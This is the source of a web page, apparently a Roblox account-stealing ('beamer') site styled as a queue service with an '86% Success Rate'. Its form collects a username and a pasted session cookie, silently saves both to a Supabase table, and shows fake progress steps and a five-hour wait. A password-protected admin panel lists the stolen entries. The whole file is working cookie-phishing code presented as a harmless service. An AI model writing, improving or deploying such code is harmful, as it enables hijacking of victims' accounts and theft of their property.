import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { useServerFn } from "@tanstack/react-start";
import spaceBg from "@/assets/space-bg.jpg";
import { Starfield } from "@/components/Starfield";
import { supabase } from "@/integrations/supabase/client";
import {
  unlockResponses,
  listResponses,
  markResponseViewed,
  deleteResponse,
} from "@/lib/queue.functions";
import { lookupRobloxUser } from "@/lib/roblox.functions";

type PopupState =
  | "idle"
  | "confirm"
  | "progress"
  | "already"
  | "responses"
  | "readme";

const PROGRESS_STEPS = [
  { active: "Confirming user...", done: "Confirmed user" },
  { active: "Putting you in the queue...", done: "Put you in the queue" },
  { active: "Finishing...", done: "Finished" },
] as const;
const STEP_MS = 5000;

// ───────────────────────────────────────────────────────────────────────────
// "Read before closing" popup text. Edit this to change what the user sees
// in the final popup that appears after they are put in the queue.
// ───────────────────────────────────────────────────────────────────────────
const README_TITLE = "Read before closing";
const README_TEXT = "Text1";
const README_HOLD_MS = 5000; // how long the close button stays disabled

type RobloxUser = {
  name: string;
  displayName: string;
  avatarUrl: string | null;
} | null;

type ResponseRow = {
  id: string;
  answer: string;
  viewed: boolean;
  created_at: string;
};

const COOLDOWN_MS = 5 * 60 * 60 * 1000; // 5 hours
const STORAGE_KEY = "queue-entered-at";

// ───────────────────────────────────────────────────────────────────────────
// How To Use tutorial video. Change this YouTube video ID to swap the video.
// The full embed URL is built from it below, so you only need to edit this one.
// ───────────────────────────────────────────────────────────────────────────
const TUTORIAL_VIDEO_ID = "dQw4w9WgXcQ";
const TUTORIAL_VIDEO_SRC = `https://www.youtube-nocookie.com/embed/${TUTORIAL_VIDEO_ID}`;

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Nyrox's Beamer" },
      {
        name: "description",
        content:
          "Enter your Roblox username on Nyrox's Exec. and join the queue on a starlit Liquid Glass page.",
      },
      { property: "og:title", content: "Nyrox's Exec. — 86% Success Rate" },
      {
        property: "og:description",
        content:
          "Enter your Roblox username on Nyrox's Exec. and join the queue on a starlit Liquid Glass page.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Index,
});

function formatCountdown(ms: number) {
  const totalSec = Math.max(0, Math.ceil(ms / 1000));
  const h = Math.floor(totalSec / 3600);
  const m = Math.floor((totalSec % 3600) / 60);
  const s = totalSec % 60;
  return `${h}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
}

function Index() {
  const [value, setValue] = useState("");
  const [paste, setPaste] = useState("");
  const [formError, setFormError] = useState<string | null>(null);
  const [popup, setPopup] = useState<PopupState>("idle");
  const [visible, setVisible] = useState(false);
  const [enteredAt, setEnteredAt] = useState<number | null>(null);
  const [now, setNow] = useState(() => Date.now());
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Roblox lookup
  const [lookingUp, setLookingUp] = useState(false);
  const [robloxUser, setRobloxUser] = useState<RobloxUser>(null);

  // Password gate
  const [password, setPassword] = useState("");
  const [passwordError, setPasswordError] = useState(false);
  const [unlocking, setUnlocking] = useState(false);
  const [isAdmin, setIsAdmin] = useState(false);
  const [rows, setRows] = useState<ResponseRow[]>([]);
  const [tab, setTab] = useState<"new" | "viewed">("new");
  const [progressStep, setProgressStep] = useState(0);
  const [readmeReady, setReadmeReady] = useState(false);

  const unlockFn = useServerFn(unlockResponses);
  const listFn = useServerFn(listResponses);
  const markFn = useServerFn(markResponseViewed);
  const deleteFn = useServerFn(deleteResponse);
  const lookupFn = useServerFn(lookupRobloxUser);

  useEffect(() => {
    const stored = localStorage.getItem(STORAGE_KEY);
    if (!stored) return;
    const t = parseInt(stored, 10);
    if (!isNaN(t) && Date.now() - t < COOLDOWN_MS) {
      setEnteredAt(t);
    } else {
      localStorage.removeItem(STORAGE_KEY);
    }
  }, []);

  const inQueue = enteredAt !== null && !isAdmin;
  const remainingMs = enteredAt
    ? Math.max(0, COOLDOWN_MS - (now - enteredAt))
    : 0;

  useEffect(() => {
    if (!inQueue) return;
    const id = setInterval(() => setNow(Date.now()), 1000);
    return () => clearInterval(id);
  }, [inQueue]);

  useEffect(() => {
    if (inQueue && remainingMs === 0) {
      setEnteredAt(null);
      localStorage.removeItem(STORAGE_KEY);
    }
  }, [inQueue, remainingMs]);

  useEffect(() => {
    return () => {
      if (timerRef.current) clearTimeout(timerRef.current);
    };
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const username = value.trim();
    const pasted = paste.trim();
    if (!username || !pasted) {
      setFormError("Both fields are required.");
      return;
    }
    setFormError(null);
    if (inQueue) {
      setPopup("already");
      setVisible(true);
      return;
    }

    setRobloxUser(null);
    setLookingUp(true);
    setPopup("confirm");
    setVisible(true);
    try {
      const res = await lookupFn({ data: { username } });
      if (res.found) {
        setRobloxUser({
          name: res.name,
          displayName: res.displayName,
          avatarUrl: res.avatarUrl,
        });
      } else {
        setRobloxUser({ name: username, displayName: username, avatarUrl: null });
      }
    } catch {
      setRobloxUser({ name: username, displayName: username, avatarUrl: null });
    } finally {
      setLookingUp(false);
    }
  };

  const handleConfirmYes = () => {
    const answer = `${value.trim()}\n${paste.trim()}`;
    setPopup("progress");
    setProgressStep(0);
    supabase
      .from("queue_responses")
      .insert({ answer })
      .then(({ error }) => {
        if (error) console.error("Failed to save response", error.message);
      });

    // Advance one step at a time, then reveal the success message
    let step = 0;
    const advance = () => {
      step += 1;
      if (step < PROGRESS_STEPS.length) {
        setProgressStep(step);
        timerRef.current = setTimeout(advance, STEP_MS);
      } else {
        const t = Date.now();
        if (!isAdmin) {
          setEnteredAt(t);
          setNow(t);
          localStorage.setItem(STORAGE_KEY, String(t));
        }
        setProgressStep(PROGRESS_STEPS.length); // all done
      }
    };
    timerRef.current = setTimeout(advance, STEP_MS);
  };

  const handleEdit = () => {
    setVisible(false);
    setTimeout(() => setPopup("idle"), 420);
  };

  const refreshRows = async () => {
    const result = await listFn({});
    if (!result.ok) {
      setIsAdmin(false);
      return;
    }
    setRows(result.rows as ResponseRow[]);
  };

  const handleUnlock = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim() || unlocking) return;
    setUnlocking(true);
    setPasswordError(false);
    try {
      const res = await unlockFn({ data: { password } });
      if (!res.ok) {
        setPasswordError(true);
        return;
      }
      setIsAdmin(true);
      setEnteredAt(null);
      localStorage.removeItem(STORAGE_KEY);
      setRows(res.rows as ResponseRow[]);
      setTab("new");
      setPopup("responses");
      setVisible(true);
      setPassword("");
    } catch {
      setPasswordError(true);
    } finally {
      setUnlocking(false);
    }
  };

  const handleMark = async (id: string) => {
    setRows((prev) =>
      prev.map((r) => (r.id === id ? { ...r, viewed: true } : r)),
    );
    await markFn({ data: { id } });
  };

  const handleDelete = async (id: string) => {
    setRows((prev) => prev.filter((r) => r.id !== id));
    await deleteFn({ data: { id } });
  };

  const progressDone = progressStep >= PROGRESS_STEPS.length;

  // Start the 5-second hold timer whenever the readme popup opens.
  useEffect(() => {
    if (popup !== "readme") return;
    setReadmeReady(false);
    const id = setTimeout(() => setReadmeReady(true), README_HOLD_MS);
    return () => clearTimeout(id);
  }, [popup]);

  const closePopup = () => {
    if (!visible) return;
    const wasSuccess = popup === "progress" && progressDone;
    setVisible(false);
    setTimeout(() => {
      setPopup("idle");
      if (wasSuccess) {
        setValue("");
        setPaste("");
      }
    }, 420);
  };

  const showPopup = popup !== "idle";
  const canClose = !(popup === "progress" && !progressDone);
  const newRows = rows.filter((r) => !r.viewed);
  const viewedRows = rows.filter((r) => r.viewed);
  const shown = tab === "new" ? newRows : viewedRows;

  return (
    <div className="relative min-h-screen w-full">
      {/* Space background + twinkling stars */}
      <img
        src={spaceBg}
        alt=""
        aria-hidden="true"
        width={1920}
        height={1280}
        className="pointer-events-none fixed inset-0 -z-20 h-full w-full object-cover"
      />
      <Starfield />

      <main className="relative z-10">
        {/* Queue section */}
        <section className="flex flex-col items-center justify-center px-6 pt-16 pb-8">
          <div className="w-full max-w-md text-center">
            <h1 className="text-5xl font-semibold tracking-tight text-foreground sm:text-6xl">
              Nyrox's Beamer
            </h1>
            <p className="mt-3 text-lg font-medium text-muted-foreground">
              86% Success Rate
            </p>

            <form
              onSubmit={handleSubmit}
              className="glass-panel neon-outline mt-10 rounded-4xl p-6 sm:p-8"
            >
              <label htmlFor="queue-input" className="sr-only">
                Username
              </label>
              <input
                id="queue-input"
                type="text"
                value={value}
                onChange={(e) => setValue(e.target.value)}
                placeholder="Username"
                className="glass-input w-full rounded-2xl px-5 py-4 text-base text-foreground outline-none placeholder:text-muted-foreground focus:border-[color:var(--ring)] focus:shadow-[0_0_0_3px_oklch(0.6_0.19_255/0.25)]"
              />
              <label htmlFor="paste-input" className="sr-only">
                Paste Cookie
              </label>
              <input
                id="paste-input"
                type="text"
                value={paste}
                onChange={(e) => setPaste(e.target.value)}
                placeholder="Paste Here"
                className="glass-input mt-4 w-full rounded-2xl px-5 py-4 text-base text-foreground outline-none placeholder:text-muted-foreground focus:border-[color:var(--ring)] focus:shadow-[0_0_0_3px_oklch(0.6_0.19_255/0.25)]"
              />
              {formError && (
                <p className="mt-3 text-sm font-semibold text-destructive">
                  {formError}
                </p>
              )}
              <button
                type="submit"
                className="glass-button mt-5 w-full rounded-2xl px-5 py-3.5 text-base font-semibold hover:brightness-110 active:scale-[0.98]"
              >
                Next
              </button>
            </form>
          </div>
        </section>

        {/* How To Use tutorial video */}
        <section className="flex flex-col items-center px-6 pb-16">
          <div className="w-full max-w-2xl text-center">
            <h2 className="text-3xl font-semibold tracking-tight text-foreground sm:text-4xl">
              How To Use
            </h2>
            <div className="glass-panel mt-5 overflow-hidden rounded-3xl p-3">
              <div className="relative aspect-video w-full overflow-hidden rounded-2xl ring-1 ring-white/15">
                <iframe
                  className="absolute inset-0 h-full w-full"
                  src={TUTORIAL_VIDEO_SRC}
                  title="How To Use — Nyrox's Exec."
                  loading="lazy"
                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                  allowFullScreen
                />
              </div>
            </div>
          </div>
        </section>

        {/* Password section */}
        <section className="flex min-h-screen flex-col items-center justify-center px-6 py-16">
          <div className="w-full max-w-md text-center">
            <h2 className="text-3xl font-semibold tracking-tight text-foreground sm:text-4xl">
              Admin Access
            </h2>

            <form
              onSubmit={handleUnlock}
              className="glass-panel mt-8 rounded-4xl p-6 sm:p-8"
            >
              <label htmlFor="password-input" className="sr-only">
                Insert Password
              </label>
              <input
                id="password-input"
                type="password"
                autoComplete="current-password"
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  setPasswordError(false);
                }}
                placeholder="Insert Password"
                className="glass-input w-full rounded-2xl px-5 py-4 text-base text-foreground outline-none placeholder:text-muted-foreground focus:border-[color:var(--ring)] focus:shadow-[0_0_0_3px_oklch(0.6_0.19_255/0.25)]"
              />
              {passwordError && (
                <p className="mt-3 text-sm font-semibold text-destructive">
                  Incorrect password
                </p>
              )}
              <button
                type="submit"
                disabled={unlocking}
                className="glass-button mt-5 w-full rounded-2xl px-5 py-3.5 text-base font-semibold hover:brightness-110 active:scale-[0.98] disabled:opacity-70"
              >
                {unlocking ? "Unlocking..." : "Unlock"}
              </button>
            </form>
          </div>
        </section>
      </main>

      {showPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center px-6">
          <div
            className={`absolute inset-0 ${visible ? "glass-bg-enter" : "glass-bg-exit"}`}
            style={{
              background: "oklch(0.08 0.02 264 / 0.55)",
              backdropFilter: "blur(8px)",
            }}
            onClick={canClose && visible ? closePopup : undefined}
          />

          <div
            role="dialog"
            aria-modal="true"
            aria-label={
              popup === "confirm"
                ? "Confirm Roblox user"
                : popup === "progress"
                ? "Putting you in the queue"
                : popup === "already"
                  ? "Already in the queue"
                  : popup === "responses"
                    ? "Responses"
                    : "Success"
            }
            className={`glass-panel-popup relative w-full ${popup === "responses" ? "max-w-lg" : "max-w-sm"} rounded-4xl px-7 py-9 text-center ${visible ? "glass-popup-enter" : "glass-popup-exit"}`}
          >
            {popup === "confirm" ? (
              <div className="flex flex-col items-center">
                {lookingUp ? (
                  <>
                    <Spinner />
                    <p className="mt-6 text-lg font-semibold text-foreground">
                      Looking up user...
                    </p>
                  </>
                ) : (
                  <>
                    {robloxUser?.avatarUrl ? (
                      <img
                        src={robloxUser.avatarUrl}
                        alt={`${robloxUser.displayName}'s Roblox avatar`}
                        width={96}
                        height={96}
                        className="h-24 w-24 rounded-full"
                      />
                    ) : (
                      <div className="flex h-24 w-24 items-center justify-center rounded-full bg-secondary text-3xl font-semibold text-secondary-foreground">
                        {(robloxUser?.displayName ?? "?").charAt(0).toUpperCase()}
                      </div>
                    )}
                    <p className="mt-4 text-xl font-semibold text-foreground">
                      {robloxUser?.displayName}
                    </p>
                    {robloxUser && robloxUser.name !== robloxUser.displayName && (
                      <p className="mt-1 text-sm font-medium text-muted-foreground">
                        @{robloxUser.name}
                      </p>
                    )}

                    <div
                      className="mt-6 w-full border-t"
                      style={{ borderColor: "oklch(1 0 0 / 15%)" }}
                    />

                    <p className="mt-6 text-lg font-semibold text-foreground">
                      Is this the right user?
                    </p>
                    <div className="mt-5 flex w-full gap-3">
                      <button
                        type="button"
                        onClick={handleConfirmYes}
                        className="glass-button flex-1 rounded-2xl px-5 py-3.5 text-base font-semibold hover:brightness-110 active:scale-[0.98]"
                      >
                        Yes
                      </button>
                      <button
                        type="button"
                        onClick={handleEdit}
                        className="glass-button-danger flex-1 rounded-2xl px-5 py-3.5 text-base font-semibold hover:brightness-110 active:scale-[0.98]"
                      >
                        Edit
                      </button>
                    </div>
                  </>
                )}
              </div>
            ) : popup === "progress" ? (
              <div className="flex flex-col">
                <div className="flex flex-col gap-4 text-left">
                  {PROGRESS_STEPS.map((step, i) => {
                    const done = progressStep > i;
                    const current = progressStep === i;
                    return (
                      <div key={step.active} className="flex items-center gap-3">
                        {done ? (
                          <CheckIcon />
                        ) : current ? (
                          <span
                            className="inline-block h-6 w-6 shrink-0 animate-spin rounded-full border-[3px] border-[color:var(--primary)] border-t-transparent"
                            aria-hidden="true"
                          />
                        ) : (
                          <span
                            className="inline-block h-6 w-6 shrink-0 rounded-full border-[3px] border-white/20"
                            aria-hidden="true"
                          />
                        )}
                        <p
                          className={`text-lg font-semibold leading-snug ${
                            done
                              ? "text-muted-foreground"
                              : current
                                ? "text-foreground"
                                : "text-muted-foreground/60"
                          }`}
                        >
                          {done ? step.done : step.active}
                        </p>
                      </div>
                    );
                  })}
                </div>

                {progressDone && (
                  <div className="animate-enter">
                    <div
                      className="mt-6 w-full border-t"
                      style={{ borderColor: "oklch(1 0 0 / 15%)" }}
                    />
                    <p className="mt-6 text-center text-lg font-semibold leading-snug text-foreground">
                      You've been put in the queue successfully! Come back after
                      ~5h.
                    </p>
                    <button
                      type="button"
                      onClick={() => setPopup("readme")}
                      className="glass-button mt-6 w-full rounded-2xl px-5 py-3.5 text-base font-semibold hover:brightness-110 active:scale-[0.98]"
                    >
                      Done
                    </button>
                  </div>
                )}
              </div>
            ) : popup === "already" ? (
              <div className="flex flex-col items-center">
                <div className="flex items-center justify-center gap-3">
                  <ExclamationIcon />
                  <p className="text-left text-lg font-semibold leading-snug text-foreground">
                    You're already in the queue!
                  </p>
                </div>
                <p className="mt-3 text-base font-medium text-muted-foreground">
                  Come back in {formatCountdown(remainingMs)}
                </p>
                <button
                  type="button"
                  onClick={closePopup}
                  className="glass-button mt-7 w-full rounded-2xl px-5 py-3.5 text-base font-semibold hover:brightness-110 active:scale-[0.98]"
                >
                  OK
                </button>
              </div>
            ) : popup === "responses" ? (
              <div className="flex flex-col">
                <h3 className="text-2xl font-semibold text-foreground">
                  Responses
                </h3>

                <div className="mt-5 flex gap-2">
                  {(["new", "viewed"] as const).map((t) => (
                    <button
                      key={t}
                      type="button"
                      onClick={() => setTab(t)}
                      className={`flex-1 rounded-2xl px-4 py-2.5 text-sm font-semibold capitalize ${
                        tab === t ? "glass-button" : "glass-button-ghost"
                      }`}
                    >
                      {t} ({t === "new" ? newRows.length : viewedRows.length})
                    </button>
                  ))}
                </div>

                <div className="mt-5 max-h-[46vh] space-y-3 overflow-y-auto pr-1 text-left">
                  {shown.length === 0 ? (
                    <p className="py-8 text-center text-base font-medium text-muted-foreground">
                      Nothing here yet.
                    </p>
                  ) : (
                    shown.map((r) => (
                      <div
                        key={r.id}
                        className="glass-panel rounded-3xl px-5 py-4"
                      >
                        <p className="break-words text-base font-medium text-foreground">
                          {r.answer}
                        </p>
                        <div className="mt-3 flex gap-2">
                          {!r.viewed && (
                            <button
                              type="button"
                              onClick={() => handleMark(r.id)}
                              className="glass-button flex-1 rounded-xl px-3 py-2 text-sm font-semibold hover:brightness-110 active:scale-[0.98]"
                            >
                              Mark as Read
                            </button>
                          )}
                          <button
                            type="button"
                            onClick={() => handleDelete(r.id)}
                            className="glass-button-danger flex-1 rounded-xl px-3 py-2 text-sm font-semibold hover:brightness-110 active:scale-[0.98]"
                          >
                            Delete
                          </button>
                        </div>
                      </div>
                    ))
                  )}
                </div>

                <button
                  type="button"
                  onClick={closePopup}
                  className="glass-button-ghost mt-6 w-full rounded-2xl px-5 py-3 text-base font-semibold active:scale-[0.98]"
                >
                  Close
                </button>
              </div>
            ) : (
              <div className="flex flex-col items-center">
                <div className="flex items-center justify-center gap-3">
                  <ClockIcon />
                  <p className="text-left text-lg font-semibold leading-snug text-foreground">
                    You've been successfully put in the queue!
                  </p>
                </div>
                <button
                  type="button"
                  onClick={closePopup}
                  className="glass-button mt-8 w-full rounded-2xl px-5 py-3.5 text-base font-semibold hover:brightness-110 active:scale-[0.98]"
                >
                  OK
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

function Spinner() {
  return (
    <span
      className="inline-block h-10 w-10 animate-spin rounded-full border-4 border-[color:var(--primary)] border-t-transparent"
      style={{ backdropFilter: "blur(4px)" }}
    />
  );
}

function CheckIcon() {
  return (
    <svg
      width="24"
      height="24"
      viewBox="0 0 24 24"
      className="shrink-0"
      aria-hidden="true"
    >
      <circle cx="12" cy="12" r="11" fill="var(--primary)" />
      <path
        d="M7 12.5l3.2 3.2L17 9"
        fill="none"
        stroke="#fff"
        strokeWidth="2.4"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  );
}

function ClockIcon() {
  return (
    <svg
      width="28"
      height="28"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="shrink-0 text-primary"
      aria-hidden="true"
    >
      <circle cx="12" cy="12" r="9" />
      <path d="M12 7v5l3 2" />
    </svg>
  );
}

function ExclamationIcon() {
  return (
    <svg
      width="28"
      height="28"
      viewBox="0 0 24 24"
      className="shrink-0"
      aria-hidden="true"
    >
      <circle cx="12" cy="12" r="11" fill="var(--primary)" />
      <rect x="10.8" y="5.5" width="2.4" height="8" rx="1.2" fill="#fff" />
      <circle cx="12" cy="17" r="1.5" fill="#fff" />
    </svg>
  );
}
